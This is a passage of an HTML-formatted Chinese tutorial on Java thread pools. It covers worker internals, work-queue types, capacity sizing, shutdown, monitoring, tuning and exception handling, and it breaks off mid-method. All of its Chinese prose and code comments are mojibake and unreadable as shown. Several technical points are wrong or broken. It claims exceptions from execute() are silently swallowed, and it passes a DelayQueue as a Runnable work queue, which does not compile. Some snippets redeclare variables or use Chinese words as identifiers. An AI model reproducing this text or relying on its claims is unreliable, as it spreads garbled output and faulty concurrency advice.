<span class="hljs-comment">// Workerå†…éƒ¨åˆ›å»ºThread</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(worker);

<span class="hljs-comment">// 3. å¯åŠ¨çº¿ç¨‹</span>
thread.start();
<span class="hljs-comment">// â†’ æ‰§è¡Œworker.run()</span>
<span class="hljs-comment">// â†’ è°ƒç”¨runWorker(worker)</span>

<span class="hljs-comment">// 4. runWorker()å¼€å§‹å·¥ä½œ</span>
runWorker(worker) {
    <span class="hljs-comment">// æ‰§è¡Œç¬¬ä¸€ä¸ªä»»åŠ¡</span>
    task.run();  <span class="hljs-comment">// æ‰“å°"ä»»åŠ¡"</span>
    
    <span class="hljs-comment">// å¾ªç¯è·å–æ–°ä»»åŠ¡</span>
    <span class="hljs-keyword">while</span> ((task = getTask()) != <span class="hljs-literal">null</span>) {
        task.run();  <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    }
    
    <span class="hljs-comment">// getTask()è¿”å›nullï¼Œé€€å‡ºå¾ªç¯</span>
    <span class="hljs-comment">// å¤„ç†çº¿ç¨‹é€€å‡º</span>
}

<span class="hljs-comment">// 5. getTask()ä»é˜Ÿåˆ—ä¸­è·å–ä»»åŠ¡</span>
getTask() {
    <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹ï¼šä¸€ç›´ç­‰å¾…</span>
    <span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> workQueue.take();
    <span class="hljs-keyword">return</span> task;
    
    <span class="hljs-comment">// éæ ¸å¿ƒçº¿ç¨‹ï¼šè¶…æ—¶ç­‰å¾…</span>
    <span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> workQueue.poll(<span class="hljs-number">60</span>, TimeUnit.SECONDS);
    <span class="hljs-keyword">return</span> task;  <span class="hljs-comment">// æˆ–è¿”å›nullï¼ˆè¶…æ—¶ï¼‰</span>
}
</code></pre>
<p><strong>å…³é”®ç†è§£ï¼š</strong></p>
<ol>
<li><strong>Worker</strong>ï¼šæ˜¯çº¿ç¨‹çš„"åŒ…è£…å™¨"ï¼Œæ¯ä¸ªå·¥ä½œçº¿ç¨‹å¯¹åº”ä¸€ä¸ªWorker</li>
<li><strong>runWorker()</strong>ï¼šæ˜¯çº¿ç¨‹çš„"å·¥ä½œå¾ªç¯"ï¼Œä¸æ–­å–ä»»åŠ¡ã€æ‰§è¡Œä»»åŠ¡</li>
<li><strong>getTask()</strong>ï¼šæ˜¯"å–ä»»åŠ¡"çš„æ–¹æ³•ï¼Œä»é˜Ÿåˆ—ä¸­è·å–ä»»åŠ¡</li>
<li>è¿™ä¸‰ä¸ªéƒ½æ˜¯<strong>å†…éƒ¨å®ç°</strong>ï¼Œæˆ‘ä»¬å¹³æ—¶ä½¿ç”¨çº¿ç¨‹æ± æ—¶ä¸éœ€è¦ç›´æ¥æ“ä½œå®ƒä»¬</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦äº†è§£è¿™äº›ï¼Ÿ</strong></p>
<ul>
<li>ç†è§£çº¿ç¨‹æ± çš„å·¥ä½œåŸç†</li>
<li>è°ƒè¯•çº¿ç¨‹æ± ç›¸å…³é—®é¢˜æ—¶æœ‰ç”¨</li>
<li>ç†è§£çº¿ç¨‹å¤ç”¨æœºåˆ¶ï¼ˆä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå¤šä¸ªä»»åŠ¡ï¼‰</li>
<li>ç†è§£çº¿ç¨‹å›æ”¶æœºåˆ¶ï¼ˆéæ ¸å¿ƒçº¿ç¨‹è¶…æ—¶å›æ”¶ï¼‰</li>
</ul>
<h4 data-id="heading-30">1.9 å·¥ä½œé˜Ÿåˆ—è¯¦è§£</h4>
<h5 data-id="heading-31">1.9.1 é˜Ÿåˆ—é€‰æ‹©ç­–ç•¥</h5>
<p>ä¸åŒçš„é˜Ÿåˆ—é€‚ç”¨äºä¸åŒçš„åœºæ™¯ï¼š</p>
<p><strong>1. ArrayBlockingQueueï¼ˆæœ‰ç•Œé˜Ÿåˆ—ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é€‚åˆï¼šä»»åŠ¡æ•°é‡å¯é¢„ä¼°ï¼Œéœ€è¦æ§åˆ¶å†…å­˜ä½¿ç”¨</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>)  <span class="hljs-comment">// æœ‰ç•Œé˜Ÿåˆ—ï¼Œæœ€å¤š100ä¸ªä»»åŠ¡</span>
);
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å®¹é‡å›ºå®šï¼Œä¸ä¼šæ— é™å¢é•¿</li>
<li>é€‚åˆä»»åŠ¡æ•°é‡å¯é¢„ä¼°çš„åœºæ™¯</li>
<li>é˜Ÿåˆ—æ»¡æ—¶ä¼šè§¦å‘æ‹’ç»ç­–ç•¥æˆ–åˆ›å»ºæ–°çº¿ç¨‹</li>
</ul>
<p><strong>2. LinkedBlockingQueueï¼ˆæ— ç•Œæˆ–æœ‰ç•Œé˜Ÿåˆ—ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ— ç•Œé˜Ÿåˆ—ï¼šé€‚åˆä»»åŠ¡æ•°é‡ä¸å¯é¢„ä¼°ï¼Œä½†å¤„ç†é€Ÿåº¦å¿«çš„åœºæ™¯</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;()  <span class="hljs-comment">// æ— ç•Œé˜Ÿåˆ—</span>
);

<span class="hljs-comment">// æœ‰ç•Œé˜Ÿåˆ—ï¼šé€‚åˆéœ€è¦æ§åˆ¶å†…å­˜çš„åœºæ™¯</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">200</span>)  <span class="hljs-comment">// æœ‰ç•Œé˜Ÿåˆ—</span>
);
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å¯ä»¥æ˜¯æœ‰ç•Œæˆ–æ— ç•Œ</li>
<li>ååé‡é€šå¸¸é«˜äºArrayBlockingQueue</li>
<li>æ— ç•Œé˜Ÿåˆ—å¯èƒ½å¯¼è‡´å†…å­˜æº¢å‡º</li>
</ul>
<p><strong>3. SynchronousQueueï¼ˆåŒæ­¥é˜Ÿåˆ—ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é€‚åˆï¼šä»»åŠ¡å¤„ç†é€Ÿåº¦å¿«ï¼Œä¸éœ€è¦ç¼“å­˜ä»»åŠ¡</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">0</span>, Integer.MAX_VALUE, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">SynchronousQueue</span>&lt;&gt;()
);
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸å­˜å‚¨å…ƒç´ ï¼Œæ¯ä¸ªæ’å…¥å¿…é¡»ç­‰å¾…ç§»é™¤</li>
<li>é€‚åˆä»»åŠ¡å¤„ç†é€Ÿåº¦å¿«çš„åœºæ™¯</li>
<li>å¯ä»¥é¿å…ä»»åŠ¡åœ¨é˜Ÿåˆ—ä¸­å †ç§¯</li>
</ul>
<p><strong>4. PriorityBlockingQueueï¼ˆä¼˜å…ˆçº§é˜Ÿåˆ—ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é€‚åˆï¼šéœ€è¦æŒ‰ä¼˜å…ˆçº§æ‰§è¡Œä»»åŠ¡çš„åœºæ™¯</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>, 
        (r1, r2) -&gt; {
            <span class="hljs-comment">// è‡ªå®šä¹‰ä¼˜å…ˆçº§æ¯”è¾ƒé€»è¾‘</span>
            <span class="hljs-type">Task</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> (Task) r1;
            <span class="hljs-type">Task</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> (Task) r2;
            <span class="hljs-keyword">return</span> t2.getPriority() - t1.getPriority(); <span class="hljs-comment">// ä¼˜å…ˆçº§é«˜çš„å…ˆæ‰§è¡Œ</span>
        })
);
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æŒ‰ä¼˜å…ˆçº§æ’åº</li>
<li>é€‚åˆéœ€è¦ä¼˜å…ˆå¤„ç†æŸäº›ä»»åŠ¡çš„åœºæ™¯</li>
</ul>
<p><strong>5. DelayQueueï¼ˆå»¶è¿Ÿé˜Ÿåˆ—ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é€‚åˆï¼šéœ€è¦å»¶è¿Ÿæ‰§è¡Œæˆ–å®šæ—¶æ‰§è¡Œçš„åœºæ™¯</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">DelayQueue</span>&lt;&gt;()
);
</code></pre>
<h5 data-id="heading-32">1.9.2 é˜Ÿåˆ—å®¹é‡è®¾ç½®</h5>
<p>é˜Ÿåˆ—å®¹é‡çš„è®¾ç½®éœ€è¦è€ƒè™‘ä»¥ä¸‹å› ç´ ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è®¡ç®—å…¬å¼ï¼šé˜Ÿåˆ—å®¹é‡ = (æœ€å¤§çº¿ç¨‹æ•° - æ ¸å¿ƒçº¿ç¨‹æ•°) * æ¯ä¸ªçº¿ç¨‹å¤„ç†ä»»åŠ¡çš„æ—¶é—´ / ä»»åŠ¡åˆ°è¾¾é—´éš”</span>

<span class="hljs-comment">// ç¤ºä¾‹ï¼šå‡è®¾</span>
<span class="hljs-comment">// - æ ¸å¿ƒçº¿ç¨‹æ•°ï¼š5</span>
<span class="hljs-comment">// - æœ€å¤§çº¿ç¨‹æ•°ï¼š10</span>
<span class="hljs-comment">// - æ¯ä¸ªä»»åŠ¡å¤„ç†æ—¶é—´ï¼š100ms</span>
<span class="hljs-comment">// - ä»»åŠ¡åˆ°è¾¾é—´éš”ï¼š50ms</span>
<span class="hljs-comment">// é˜Ÿåˆ—å®¹é‡ = (10 - 5) * 100 / 50 = 10</span>

<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>)  <span class="hljs-comment">// æ ¹æ®è®¡ç®—è®¾ç½®å®¹é‡</span>
);
</code></pre>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>ä¸è¦ä½¿ç”¨æ— ç•Œé˜Ÿåˆ—ï¼ˆé™¤éä»»åŠ¡å¤„ç†é€Ÿåº¦éå¸¸å¿«ï¼‰</li>
<li>é˜Ÿåˆ—å®¹é‡åº”è¯¥æ ¹æ®å®é™…ä¸šåŠ¡åœºæ™¯è®¾ç½®</li>
<li>å¯ä»¥é€šè¿‡ç›‘æ§é˜Ÿåˆ—å¤§å°æ¥è°ƒæ•´å®¹é‡</li>
</ul>
<h4 data-id="heading-33">1.10 çº¿ç¨‹æ± çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†</h4>
<h5 data-id="heading-34">1.10.1 çº¿ç¨‹æ± çš„åˆ›å»º</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹å¼1ï¼šç›´æ¥åˆ›å»ºThreadPoolExecutorï¼ˆæ¨èï¼‰</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomThreadFactory</span>(<span class="hljs-string">"MyPool"</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()
);

<span class="hljs-comment">// æ–¹å¼2ï¼šä½¿ç”¨Executorsï¼ˆä¸æ¨èï¼Œä»…ç”¨äºæµ‹è¯•ï¼‰</span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);
</code></pre>
<h5 data-id="heading-35">1.10.2 çº¿ç¨‹æ± çš„è¿è¡Œ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æäº¤ä»»åŠ¡</span>
executor.execute(() -&gt; {
    <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
});

<span class="hljs-comment">// æäº¤æœ‰è¿”å›å€¼çš„ä»»åŠ¡</span>
Future&lt;String&gt; future = executor.submit(() -&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç»“æœ"</span>;
});

<span class="hljs-comment">// æ‰¹é‡æäº¤ä»»åŠ¡</span>
List&lt;Callable&lt;String&gt;&gt; tasks = Arrays.asList(
    () -&gt; <span class="hljs-string">"ä»»åŠ¡1"</span>,
    () -&gt; <span class="hljs-string">"ä»»åŠ¡2"</span>,
    () -&gt; <span class="hljs-string">"ä»»åŠ¡3"</span>
);
List&lt;Future&lt;String&gt;&gt; futures = executor.invokeAll(tasks);
</code></pre>
<h5 data-id="heading-36">1.10.3 çº¿ç¨‹æ± çš„å…³é—­</h5>
<p><strong>ä¼˜é›…å…³é—­çš„æ­¥éª¤ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdownThreadPool</span><span class="hljs-params">(ThreadPoolExecutor executor)</span> {
    <span class="hljs-comment">// 1. åœæ­¢æ¥å—æ–°ä»»åŠ¡</span>
    executor.shutdown();
    
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 2. ç­‰å¾…å·²æäº¤çš„ä»»åŠ¡å®Œæˆ</span>
        <span class="hljs-keyword">if</span> (!executor.awaitTermination(<span class="hljs-number">60</span>, TimeUnit.SECONDS)) {
            <span class="hljs-comment">// 3. å¦‚æœè¶…æ—¶ï¼Œå¼ºåˆ¶å…³é—­</span>
            executor.shutdownNow();
            
            <span class="hljs-comment">// 4. å†æ¬¡ç­‰å¾…ï¼Œç¡®ä¿æ‰€æœ‰ä»»åŠ¡éƒ½åœæ­¢</span>
            <span class="hljs-keyword">if</span> (!executor.awaitTermination(<span class="hljs-number">60</span>, TimeUnit.SECONDS)) {
                System.err.println(<span class="hljs-string">"çº¿ç¨‹æ± æœªèƒ½æ­£å¸¸å…³é—­"</span>);
            }
        }
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        <span class="hljs-comment">// 5. å¦‚æœå½“å‰çº¿ç¨‹è¢«ä¸­æ–­ï¼Œå¼ºåˆ¶å…³é—­</span>
        executor.shutdownNow();
        Thread.currentThread().interrupt();
    }
}
</code></pre>
<h5 data-id="heading-37">1.10.4 çº¿ç¨‹æ± çš„ç›‘æ§</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolMonitor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ThreadPoolExecutor executor;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ThreadPoolMonitor</span><span class="hljs-params">(ThreadPoolExecutor executor)</span> {
        <span class="hljs-built_in">this</span>.executor = executor;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printStatus</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"=== çº¿ç¨‹æ± çŠ¶æ€ ==="</span>);
        System.out.println(<span class="hljs-string">"æ ¸å¿ƒçº¿ç¨‹æ•°: "</span> + executor.getCorePoolSize());
        System.out.println(<span class="hljs-string">"æœ€å¤§çº¿ç¨‹æ•°: "</span> + executor.getMaximumPoolSize());
        System.out.println(<span class="hljs-string">"å½“å‰çº¿ç¨‹æ•°: "</span> + executor.getPoolSize());
        System.out.println(<span class="hljs-string">"æ´»è·ƒçº¿ç¨‹æ•°: "</span> + executor.getActiveCount());
        System.out.println(<span class="hljs-string">"å·²å®Œæˆä»»åŠ¡æ•°: "</span> + executor.getCompletedTaskCount());
        System.out.println(<span class="hljs-string">"æ€»ä»»åŠ¡æ•°: "</span> + executor.getTaskCount());
        System.out.println(<span class="hljs-string">"é˜Ÿåˆ—å¤§å°: "</span> + executor.getQueue().size());
        System.out.println(<span class="hljs-string">"é˜Ÿåˆ—å‰©ä½™å®¹é‡: "</span> + 
            (executor.getQueue().remainingCapacity()));
    }
    
    <span class="hljs-comment">// å®šæœŸç›‘æ§</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startMonitoring</span><span class="hljs-params">(<span class="hljs-type">long</span> period, TimeUnit unit)</span> {
        <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">scheduler</span> <span class="hljs-operator">=</span> Executors.newScheduledThreadPool(<span class="hljs-number">1</span>);
        scheduler.scheduleAtFixedRate(() -&gt; {
            printStatus();
        }, <span class="hljs-number">0</span>, period, unit);
    }
}
</code></pre>
<h4 data-id="heading-38">1.11 çº¿ç¨‹æ± çš„æ€§èƒ½ä¼˜åŒ–</h4>
<h5 data-id="heading-39">1.11.1 å‚æ•°è°ƒä¼˜</h5>
<p><strong>1. æ ¸å¿ƒçº¿ç¨‹æ•°çš„è®¾ç½®</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// CPUå¯†é›†å‹ï¼šæ ¸å¿ƒçº¿ç¨‹æ•° = CPUæ ¸å¿ƒæ•° + 1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">cpuCount</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();
<span class="hljs-type">int</span> <span class="hljs-variable">corePoolSize</span> <span class="hljs-operator">=</span> cpuCount + <span class="hljs-number">1</span>;

<span class="hljs-comment">// IOå¯†é›†å‹ï¼šæ ¸å¿ƒçº¿ç¨‹æ•° = CPUæ ¸å¿ƒæ•° * 2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">corePoolSize</span> <span class="hljs-operator">=</span> cpuCount * <span class="hljs-number">2</span>;

<span class="hljs-comment">// æ··åˆå‹ï¼šæ ¹æ®å®é™…æµ‹è¯•è°ƒæ•´</span>
<span class="hljs-type">int</span> <span class="hljs-variable">corePoolSize</span> <span class="hljs-operator">=</span> cpuCount;
</code></pre>
<p><strong>2. æœ€å¤§çº¿ç¨‹æ•°çš„è®¾ç½®</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸€èˆ¬è®¾ç½®ä¸ºæ ¸å¿ƒçº¿ç¨‹æ•°çš„2å€</span>
<span class="hljs-type">int</span> <span class="hljs-variable">maximumPoolSize</span> <span class="hljs-operator">=</span> corePoolSize * <span class="hljs-number">2</span>;

<span class="hljs-comment">// æˆ–è€…æ ¹æ®ä¸šåŠ¡éœ€æ±‚è®¾ç½®</span>
<span class="hljs-type">int</span> <span class="hljs-variable">maximumPoolSize</span> <span class="hljs-operator">=</span> corePoolSize + é¢„æœŸå³°å€¼ä»»åŠ¡æ•° / å•ä¸ªä»»åŠ¡å¤„ç†æ—¶é—´;
</code></pre>
<p><strong>3. é˜Ÿåˆ—å®¹é‡çš„è®¾ç½®</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ ¹æ®ä¸šåŠ¡åœºæ™¯è®¾ç½®</span>
<span class="hljs-comment">// é˜Ÿåˆ—å®¹é‡ = (æœ€å¤§çº¿ç¨‹æ•° - æ ¸å¿ƒçº¿ç¨‹æ•°) * æ¯ä¸ªçº¿ç¨‹å¤„ç†ä»»åŠ¡çš„æ—¶é—´ / ä»»åŠ¡åˆ°è¾¾é—´éš”</span>

<span class="hljs-comment">// æˆ–è€…æ ¹æ®å†…å­˜é™åˆ¶è®¾ç½®</span>
<span class="hljs-type">int</span> <span class="hljs-variable">queueCapacity</span> <span class="hljs-operator">=</span> å¯ç”¨å†…å­˜ / å•ä¸ªä»»åŠ¡å ç”¨å†…å­˜;
</code></pre>
<h5 data-id="heading-40">1.11.2 å…è®¸æ ¸å¿ƒçº¿ç¨‹è¶…æ—¶</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…è®¸æ ¸å¿ƒçº¿ç¨‹è¶…æ—¶ï¼Œæé«˜èµ„æºåˆ©ç”¨ç‡</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>)
);

<span class="hljs-comment">// å…è®¸æ ¸å¿ƒçº¿ç¨‹è¶…æ—¶</span>
executor.allowCoreThreadTimeOut(<span class="hljs-literal">true</span>);
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>ä»»åŠ¡åˆ°è¾¾ä¸è§„å¾‹</li>
<li>éœ€è¦èŠ‚çœèµ„æº</li>
<li>å¯ä»¥æ¥å—çº¿ç¨‹åˆ›å»ºçš„å¼€é”€</li>
</ul>
<h5 data-id="heading-41">1.11.3 é¢„å¯åŠ¨æ ¸å¿ƒçº¿ç¨‹</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é¢„å¯åŠ¨æ‰€æœ‰æ ¸å¿ƒçº¿ç¨‹ï¼Œæé«˜å“åº”é€Ÿåº¦</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>)
);

<span class="hljs-comment">// é¢„å¯åŠ¨æ‰€æœ‰æ ¸å¿ƒçº¿ç¨‹</span>
executor.prestartAllCoreThreads();
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>éœ€è¦å¿«é€Ÿå“åº”</li>
<li>ç³»ç»Ÿå¯åŠ¨æ—¶å¯ä»¥æ¥å—çº¿ç¨‹åˆ›å»ºçš„å¼€é”€</li>
</ul>
<h4 data-id="heading-42">1.12 çº¿ç¨‹æ± çš„å¼‚å¸¸å¤„ç†</h4>
<h5 data-id="heading-43">1.12.1 execute()æ–¹æ³•çš„å¼‚å¸¸å¤„ç†</h5>
<p><code>execute()</code>æ–¹æ³•æäº¤çš„ä»»åŠ¡å¦‚æœæŠ›å‡ºå¼‚å¸¸ï¼Œå¼‚å¸¸ä¼šè¢«åæ‰ï¼š</p>
<pre><code class="hljs language-java" lang="java">executor.execute(() -&gt; {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å¼‚å¸¸"</span>);  <span class="hljs-comment">// å¼‚å¸¸ä¼šè¢«åæ‰</span>
});

<span class="hljs-comment">// è§£å†³æ–¹æ¡ˆ1ï¼šåœ¨ä»»åŠ¡å†…éƒ¨æ•è·å¼‚å¸¸</span>
executor.execute(() -&gt; {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-comment">// å¤„ç†å¼‚å¸¸</span>
        logger.error(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå¼‚å¸¸"</span>, e);
    }
});

<span class="hljs-comment">// è§£å†³æ–¹æ¡ˆ2ï¼šä½¿ç”¨è‡ªå®šä¹‰çš„ThreadFactoryè®¾ç½®å¼‚å¸¸å¤„ç†å™¨</span>
<span class="hljs-type">ThreadFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> r -&gt; {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);
    t.setUncaughtExceptionHandler((thread, ex) -&gt; {
        logger.error(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œå¼‚å¸¸"</span>, ex);
    });
    <span class="hljs-keyword">return</span> t;
};
</code></pre>
<h5 data-id="heading-44">1.12.2 submit()æ–¹æ³•çš„å¼‚å¸¸å¤„ç†</h5>
<p><code>submit()</code>æ–¹æ³•æäº¤çš„ä»»åŠ¡å¦‚æœæŠ›å‡ºå¼‚å¸¸ï¼Œå¼‚å¸¸ä¼šè¢«åŒ…è£…åœ¨<code>Future</code>ä¸­ï¼š</p>
<pre><code class="hljs language-java" lang="java">Future&lt;?&gt; future = executor.submit(() -&gt; {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å¼‚å¸¸"</span>);
});

<span class="hljs-keyword">try</span> {
    future.get();  <span class="hljs-comment">// è¿™é‡Œä¼šæŠ›å‡ºExecutionException</span>
} <span class="hljs-keyword">catch</span> (ExecutionException e) {
    <span class="hljs-type">Throwable</span> <span class="hljs-variable">cause</span> <span class="hljs-operator">=</span> e.getCause();  <span class="hljs-comment">// è·å–åŸå§‹å¼‚å¸¸</span>
    logger.error(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå¼‚å¸¸"</span>, cause);
}
</code></pre>
<h5 data-id="heading-45">1.12.3 é‡å†™afterExecute()æ–¹æ³•</h5>
<p>å¯ä»¥é‡å†™<code>ThreadPoolExecutor</code>çš„<code>afterExecute()</code>æ–¹æ³•æ¥ç»Ÿä¸€å¤„ç†å¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomThreadPoolExecutor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ThreadPoolExecutor</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomThreadPoolExecutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize, <span class="hljs-type">int</span> maximumPoolSize,
                                   <span class="hljs-type">long</span> keepAliveTime, TimeUnit unit,
                                   BlockingQueue&lt;Runnable&gt; workQueue)</span> {
        <span class="hljs-built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterExecute</span><span class="hljs-params">(Runnable r, Throwable t)</span> {
        <span class="hljs-built_in">super</span>.afterExecute(r, t);
        
        <span class="hljs-comment">// å¤„ç†å¼‚å¸¸</span>
